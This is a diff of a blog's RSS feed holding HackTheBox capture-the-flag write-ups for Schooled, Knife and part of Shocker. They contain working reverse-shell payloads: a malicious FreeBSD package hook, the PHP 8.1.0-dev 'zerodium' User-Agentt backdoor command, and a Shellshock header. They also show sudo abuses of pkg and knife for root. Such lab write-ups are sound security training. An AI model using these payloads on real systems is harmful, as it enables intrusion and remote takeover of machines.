+<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span>
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>User <strong>jamie</strong> is allowed to run sudo on <code>pkg</code> binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo -l
+User jamie may run the following commands on Schooled:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg install *
+</code></pre></div><p>According to <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFObins</a>, this can be abused to install malicious FreeBSD package, but <code>fpm </code> has to be <a href="https://github.com/jordansissel/fpm">installed</a> first.</p>
+<h4 id="installing-a-malicious-package">Installing a Malicious Package</h4>
+<p>Using reference from GTFOBins, I can create a malicious package that contains a reverse shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
+$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol&#39;</span> &gt; <span class="nv">$TF</span>/x.sh<span class="p">;</span>fpm -n x -s dir -t freebsd -a all --before-install <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
+DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use <span class="c1">#finish to prevent that.</span>
+/var/lib/gems/2.5.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in <span class="sb">`</span>initialize<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new&#39;</span>
+        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in <span class="sb">`</span>block in output<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open&#39;</span>
+        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in <span class="sb">`</span>output<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute&#39;</span>
+        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in <span class="sb">`</span>run<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run&#39;</span>
+        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in <span class="sb">`</span>run<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/bin/fpm:7:in `&lt;top (required)&gt;&#39;</span>
+        /usr/local/bin/fpm:23:in <span class="sb">`</span>load<span class="s1">&#39;
+</span><span class="s1">        /usr/local/bin/fpm:23:in `&lt;main&gt;&#39;</span>
+Created package <span class="o">{</span>:path<span class="o">=</span>&gt;<span class="s2">&#34;x-1.0.txz&#34;</span><span class="o">}</span>
+</code></pre></div><p>I will transfer the package to Schooled.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
+$ <span class="k">$(</span>bash -c <span class="s1">&#39;cat x-1.0.txz &gt; /dev/tcp/10.10.10.234/9000&#39;</span><span class="k">)</span>
+</code></pre></div><blockquote>
+<p><code>/dev/tcp/</code> is a feature from Bash. Since my shell is Zsh, so I had to invoke the transfer command within a subshell.</p>
+</blockquote>
+<p>On Schooled:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ nc -lv <span class="m">9000</span> &gt; x-1.0.txz
+Connection from 10.10.14.49 <span class="m">60744</span> received!
+</code></pre></div><p>I will setup a Netcat listener on my Kali and start the installation of the package on Schooled.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
+pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
+pkg: Repository FreeBSD cannot be opened. <span class="s1">&#39;pkg update&#39;</span> required
+Checking integrity... <span class="k">done</span> <span class="o">(</span><span class="m">0</span> conflicting<span class="o">)</span>
+The following <span class="m">1</span> package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of <span class="m">0</span> checked<span class="o">)</span>:
+
+New packages to be INSTALLED:
+        x: 1.0
+
+Number of packages to be installed: <span class="m">1</span>
+<span class="o">[</span>1/1<span class="o">]</span> Installing x-1.0...
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>And I&rsquo;m rooted.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">23093</span>
+<span class="c1"># whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; cut -c-15 /root/root.txt</span>
+root
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>,5<span class="o">(</span>operator<span class="o">)</span>
+Schooled
+2462d8e2125d2a0
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://github.com/HoangKien1020/CVE-2020-25627">https://github.com/HoangKien1020/CVE-2020-25627</a></li>
+<li><a href="https://github.com/HoangKien1020/CVE-2020-14321">https://github.com/HoangKien1020/CVE-2020-14321</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/pkg/">https://gtfobins.github.io/gtfobins/pkg/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Schooled</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-schooled/</link>
       <pubDate>Thu, 16 Sep 2021 18:22:05 +0700</pubDate>
       
@@ -421,6 +834,127 @@ Schooled
     
     <item>
       <title>HackTheBox - Knife</title>
+      <link>https://fahmifj.github.io/hackthebox/knife/</link>
+      <pubDate>Sat, 28 Aug 2021 22:00:49 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/knife/</guid>
+      <description>Exploiting the backdoor planted in PHP 8.1-dev</description>
+      <content:encoded><![CDATA[<p>Knife hosts a website that is running a hijacked version of PHP in which it contains a remote code execution backdoor. Leveraging this backdoor results in an interactive shell access to the system. The user has sudo permissions on <code>knife</code> , which can be exploited to run a malicious Ruby code.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Using a backdoor from a supply chain attack 😅</li>
+<li>Sudo exploitation on <code>knife</code>.</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>BurpSuite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Performing <code>nmap</code> all TCP scan discovers two open ports, SSH on 22 and an Apache web server on 80. Nothing much to see here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «knife» «10.10.14.117»
+$ fscan 10.10.10.242 knife
+nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.10.242 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p 22,80 -sC -sV -oA nmap/10-tcp-allport-knife 10.10.10.242
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-27 10:19 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.242
+Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey:
+<span class="p">|</span>   <span class="m">3072</span> be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title:  Emergent Medical Idea
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 26.44 seconds
+</code></pre></div><blockquote>
+<p>fscan is just my Nmap wrapper to do full scan and immediately run script scan against the discovered ports .</p>
+</blockquote>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80----website">TCP 80  - Website</h3>
+<p>With <code>curl</code>, the hosted website shows that it&rsquo;s powered by PHP 8.1.0-dev.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «knife» «10.10.14.70» 
+$ curl -sI http://10.10.10.242/
+HTTP/1.1 <span class="m">200</span> OK
+Date: Sat, <span class="m">22</span> May <span class="m">2021</span> 21:46:13 GMT
+Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+X-Powered-By: PHP/8.1.0-dev
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</code></pre></div><p>The website only displays some CSS text animation. The available menus aren&rsquo;t clickable.</p>
+<p><div class="img-container"><img src="imgs/image-20210827213646250.png" alt="image-20210827213646250"  /></div>
+</p>
+<p>I did a Gobuster scan but it didn&rsquo;t output any interesting thing.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-james">Shell as james</h3>
+<h4 id="php-rce-backdoor">PHP RCE backdoor</h4>
+<p>Around March 2021, the PHP git server was compromised and two <a href="https://news-web.php.net/php.internals/113838">malicious commit</a> were pushed to the PHP source code. The code from these commits allows an attacker to obtain remote code execution through the HTTP <code>User-Agent</code> header on any website that uses the hijacked version of PHP. In short, it&rsquo;s a backdoor.</p>
+<p>The commits were pushed into the development branch of PHP 8.1. From the previous web enumeration, the website returns with <code>X-Powered-By: PHP/8.1.0-dev</code> in its HTTP response. By presuming that the website uses the hijacked version of PHP, I can try to send a HTTP request with the following HTTP header.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">User-Agentt: zerodiumsystem(&#39;uname -a&#39;);
+</span></code></pre></div><p>And the web was vulnerable.</p>
+<p><div class="img-container"><img src="imgs/image-20210827224703632.png" alt="image-20210827224703632"  /></div>
+</p>
+<p>Now to get reverse shell, I can send the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">User-Agentt: zerodiumsystem(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.70/9000 0&gt;&amp;1&#34;&#39;);
+</span></code></pre></div><p>When I send that payload, I have interactive shell access as <strong>james</strong> on my listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «knife» «10.10.14.70» 
+$ nc -nvlp <span class="m">9000</span>  
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+connect to <span class="o">[</span>10.10.14.70<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.242<span class="o">]</span> <span class="m">48566</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>966<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+james@knife:/$ id
+id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span>
+</code></pre></div><p>I also made a script to leverage this backdoor, <a href="https://github.com/fahmifj/php-8.1.0-dev-zerodium-rce">here</a>.</p>
+<h4 id="shell-upgrade">Shell upgrade</h4>
+<p>I will do the PTY trick to upgrade my shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+james@knife:/$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+james@knife:/$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">15541</span> suspended  nc -nvlp <span class="m">9000</span>
+→ root@kali «knife» «10.10.14.70» 
+$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">15541</span> continued  nc -nvlp <span class="m">9000</span>
+james@knife:/$ 
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>User <strong>james</strong> is allowed to run <code>knife</code> as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:/opt/chef-workstation/bin$ sudo -l
+Matching Defaults entries <span class="k">for</span> james on knife:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User james may run the following commands on knife:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife
+</code></pre></div><h4 id="sudo---knife">Sudo - knife</h4>
+<p><code>knife</code> is a part of <a href="https://www.chef.io/products/chef-infra">Chef</a>, a software for infrastructure management and automation. I&rsquo;m not familiar with that, but according to <a href="https://docs.chef.io/workstation/knife_exec/#examples">this documentation</a>, <code>knife</code> can run a Ruby code or Ruby file script. Therefore, the tool can be abused like this.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:~$ sudo knife <span class="nb">exec</span> -E <span class="s2">&#34;exec &#39;/bin/bash&#39;&#34;</span>
+root@knife:/home/james# id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div><p>Now I can grab the root flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@knife:/home/james# cat /root/root.txt 
+c3744...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://news-web.php.net/php.internals/113838">https://news-web.php.net/php.internals/113838</a></li>
+<li><a href="https://docs.chef.io/workstation/knife_exec/#examples">https://docs.chef.io/workstation/knife_exec/#examples</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Knife</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-knife/</link>
       <pubDate>Sat, 28 Aug 2021 22:00:49 +0700</pubDate>
       
@@ -542,10 +1076,10 @@ c3744...<span class="o">[</span>SNIP<span class="o">]</span>...
     
     <item>
       <title>HackTheBox - Traverxec</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-traverxec/</link>
+      <link>https://fahmifj.github.io/hackthebox/traverxec/</link>
       <pubDate>Fri, 06 Aug 2021 16:12:18 +0700</pubDate>
       
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-traverxec/</guid>
+      <guid>https://fahmifj.github.io/hackthebox/traverxec/</guid>
       <description>Code execution with path traversal</description>
       <content:encoded><![CDATA[<p>Traverxec is an easy Linux machine that starts with exploitation of a Nostromo web server. The server is vulnerable to a remote code execution, and this allows me to gain an interactive shell access into the system. Enumeration of the system discovers a backup files that contains user SSH keys. The user is allowed to run a sudo on <code>journalctl</code> binary, and this could be leveraged to obtain root access.</p>
 <h4 id="skills-learned">Skills Learned</h4>
@@ -877,381 +1411,6 @@ Sorry, try again.
 <ul>
 <li><a href="https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec/">https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec/</a></li>
 <li><a href="https://gtfobins.github.io/gtfobins/journalctl/">https://gtfobins.github.io/gtfobins/journalctl/</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Shocker</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</link>
-      <pubDate>Tue, 13 Jul 2021 11:30:31 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</guid>
-      <description>Hands on with ShellShock vulnerability</description>
-      <content:encoded><![CDATA[<p>Shocker is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on <code>perl</code> , and this can leveraged as well to gain root shell.</p>
-<p>In the end of this write-up, I&rsquo;ll play a bit with Shellshock.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>Exploitation of Shellshock vulnerability</li>
-<li>Sudo exploitation on perl</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li>Burp Suite</li>
-<li>Gobuster</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-10 20:24 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.56
-Host is up <span class="o">(</span>0.065s latency<span class="o">)</span>.
-Not shown: <span class="m">65533</span> closed ports
-PORT     STATE SERVICE VERSION
-80/tcp   open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
-2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 98.00 seconds
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>The site serves only one a text and an image.</p>
-<p><div class="img-container"><img src="imgs/image-20210711072532615.png" alt="image-20210711072532615"  /></div>
-</p>
-<p>The server response contains uncommon Header called <code>Accept-Ranges</code>. According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#requesting_a_specific_range_from_a_server">MDN</a>, this header is allows us to control the portion of the HTTP message.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ curl -I http://10.10.10.56
-HTTP/1.1 <span class="m">200</span> OK
-Date: Sun, <span class="m">11</span> Jul <span class="m">2021</span> 00:49:51 GMT
-Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
-Last-Modified: Fri, <span class="m">22</span> Sep <span class="m">2017</span> 20:01:19 GMT
-ETag: <span class="s2">&#34;89-559ccac257884&#34;</span>
-Accept-Ranges: bytes
-Content-Length: <span class="m">137</span>
-Vary: Accept-Encoding
-Content-Type: text/html
-</code></pre></div><p>A <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_range_dos/">quick search</a> on google finds that it can be used for DDoS attack.</p>
-<h4 id="gobuster">Gobuster</h4>
-<p>A <code>gobuster</code> scan finds two directories:  <code>/cgi-bin/</code> and <code>/icons</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f         
-<span class="o">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/
-<span class="o">[</span>+<span class="o">]</span> Method:                  GET
-<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
-<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
-<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
-<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
-<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/07/10 20:26:07 Starting gobuster in directory enumeration <span class="nv">mode</span>
-<span class="o">===============================================================</span>
-/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 294<span class="o">]</span>
-/icons/               <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292<span class="o">]</span>
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><p>Another scan on <code>/cgi-bin/</code> discovers a file called <code>users.sh</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh
-<span class="o">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/cgi-bin
-<span class="o">[</span>+<span class="o">]</span> Method:                  GET
-<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
-<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
-<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
-<span class="o">[</span>+<span class="o">]</span> Extensions:              cgi,sh
-<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
-<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/07/10 21:43:04 Starting gobuster in directory enumeration <span class="nv">mode</span>
-<span class="o">===============================================================</span>
-/user.sh              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 125<span class="o">]</span>
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><p>The <code>script.sh</code> returns the following contents.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ curl -s http://10.10.10.56/cgi-bin/user.sh
-Content-Type: text/plain
-
-Just an uptime <span class="nb">test</span> script
-
- 21:46:09 up <span class="m">1</span> day, 20:28,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.00
-</code></pre></div><p>According to the box name and a <code>/cgi-bin/</code> folder which contains a bash script, it&rsquo;s going to be shellshock vulnerability.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-shelly">Shell as shelly</h3>
-<h4 id="shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</h4>
-<p>The Shellshock vulnerability is well explained in this <a href="https://pentesterlab.com/exercises/cve-2014-6271/course">free course</a> by PentesterLab.</p>
-<p>The following is the commonly used PoC for shellshock.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">(){</span>:<span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> &lt;bash command&gt;
-</code></pre></div><p>The PoC works on <code>User-Agent</code> header.</p>
-<p><div class="img-container"><img src="imgs/image-20210711090447537-1626151933213.png" alt="image-20210711090447537"  /></div>
-</p>
-<p>It also works on the  <code>Accept</code> header (I&rsquo;m shocked now 😄).</p>
-<p><div class="img-container"><img src="imgs/image-20210711085942731.png" alt="image-20210711085942731"  /></div>
-</p>
-<h4 id="reverse-shell">Reverse Shell</h4>
-<p>I tried to get a shell but somehow it didn&rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!</p>
-<p><div class="img-container"><img src="imgs/image-20210711091930431.png" alt="image-20210711091930431"  /></div>
-</p>
-<p>The installed <code>nc</code> doesn&rsquo;t have <code>-e</code>.</p>
-<p><div class="img-container"><img src="imgs/image-20210711092401328.png" alt="image-20210711092401328"  /></div>
-</p>
-<p>The following bash reverse shell works.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">()</span> <span class="o">{</span> :<span class="p">;</span><span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.83/53 0&gt;&amp;1&#34;</span> <span class="p">|</span> /bin/bash
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210711093314357.png" alt="image-20210711093314357"  /></div>
-</p>
-<h4 id="shell-upgrade">Shell Upgrade</h4>
-<p>I&rsquo;ll upgrade my shell using the PTY trick (that&rsquo;s how I called it).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash                    
-script /dev/null -c bash
-Script started, file is /dev/null
-shelly@Shocker:/usr/lib/cgi-bin$ ^Z
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> suspended  nc -nvlp <span class="m">53</span>
-→ kali@kali «shocker» «10.10.14.83» 
-$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> continued  nc -nvlp <span class="m">53</span>
-
-shelly@Shocker:/usr/lib/cgi-bin$  
-</code></pre></div><p>The user flag is done here.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ ls -l 
-total <span class="m">8</span>
-drwxr-xr-x <span class="m">2</span> shelly shelly <span class="m">4096</span> Jul <span class="m">10</span> 03:31 <span class="nb">test</span>
--r--r--r-- <span class="m">1</span> root   root     <span class="m">33</span> Jul  <span class="m">9</span> 01:17 user.txt
-shelly@Shocker:/home/shelly$ cat user.txt 
-7ac9eb73e6cb...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-root">Shell as root</h3>
